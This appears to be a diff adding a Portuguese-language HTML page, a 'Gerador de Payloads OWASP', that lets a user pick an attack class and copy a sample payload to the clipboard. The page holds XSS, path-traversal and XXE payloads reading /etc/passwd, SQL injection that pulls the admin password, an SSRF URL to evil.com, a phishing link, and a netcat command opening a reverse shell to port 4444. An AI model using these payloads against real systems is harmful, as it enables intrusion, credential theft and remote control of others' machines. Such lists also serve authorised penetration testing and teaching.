@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerador de Payloads OWASP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f2f2f2;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        select, button {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            padding: 10px;
+            font-family: monospace;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            resize: vertical;
+            display: block; /* Agora visível */
+            margin-bottom: 10px;
+            text-align: left; /* Alinhado à esquerda */
+            white-space: pre-line; /* Mantém formatação de quebra de linha */
+        }
+        .payload {
+            display: none; /* Começa escondido */
+        }
+    </style>
+    <script>
+        function showPayloads() {
+            var payloadType = document.getElementById('payloadType').value;
+            
+            // Oculta todas as caixas de texto
+            var payloads = document.querySelectorAll('.payload');
+            payloads.forEach(function(payload) {
+                payload.style.display = 'none';
+            });
+
+            // Exibe apenas a caixa de texto correspondente ao tipo selecionado
+            var selectedPayload = document.getElementById(payloadType);
+            selectedPayload.style.display = 'block';
+        }
+
+        function copyPayloads() {
+            var selectedPayloadType = document.getElementById('payloadType').value;
+            var selectedPayload = document.getElementById(selectedPayloadType).value.trim();
+
+            // Cria um elemento temporário para copiar o texto
+            var tempTextarea = document.createElement('textarea');
+            tempTextarea.value = selectedPayload;
+            document.body.appendChild(tempTextarea);
+            tempTextarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextarea);
+
+            alert('Payload ' + selectedPayloadType.toUpperCase() + ' copiado para a área de transferência!');
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2>Gerador de Payloads OWASP</h2>
+        <label for="payloadType">Tipo de Payload:</label>
+        <select id="payloadType" name="payloadType" onchange="showPayloads()">
+            <option value="xss">XSS (Cross-Site Scripting)</option>
+            <option value="lfi">LFI (Local File Inclusion)</option>
+            <option value="sql">SQL Injection</option>
+            <option value="bypasssql">Bypass SQL Injection</option>
+            <option value="ssrf">SSRF (Server-Side Request Forgery)</option>
+            <option value="sqli">Second Order SQL Injection</option>
+            <option value="rce">Remote Code Execution (RCE)</option>
+            <option value="cmdi">Command Injection</option>
+            <option value="xml">XML External Entity (XXE)</option>
+            <option value="phishing">Phishing Payloads</option>
+            <!-- Adicione mais opções conforme necessário -->
+        </select>
+        
+        <!-- Caixas de texto para cada tipo de payload -->
+        <textarea id="xss" class="payload" readonly>
+&lt;script&gt;alert('XSS Payload');&lt;/script&gt;
+        </textarea>
+        <textarea id="lfi" class="payload" readonly>
+../../../../../../../../etc/passwd
+        </textarea>
+        <textarea id="sql" class="payload" readonly>
+' OR 1=1--
+        </textarea>
+        <textarea id="bypasssql" class="payload" readonly>
+' UNION SELECT 1, version(), 3--
+        </textarea>
+        <textarea id="ssrf" class="payload" readonly>
+http://evil.com/malicious-file.txt
+        </textarea>
+        <textarea id="sqli" class="payload" readonly>
+' UNION SELECT password FROM users WHERE username = 'admin'--
+        </textarea>
+        <textarea id="rce" class="payload" readonly>
+; nc -nv 192.168.1.1 4444 -e /bin/bash
+        </textarea>
+        <textarea id="cmdi" class="payload" readonly>
+; ls -la
+        </textarea>
+        <textarea id="xml" class="payload" readonly>
+&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+        </textarea>
+        <textarea id="phishing" class="payload" readonly>
+&lt;a href="http://malicious-site.com"&gt;Click Here to Win a Prize!&lt;/a&gt;
+        </textarea>
+
+        <button onclick="copyPayloads()">
+            Copiar Payload Selecionado
+        </button>
+    </div>
+</body>
+</html>
+
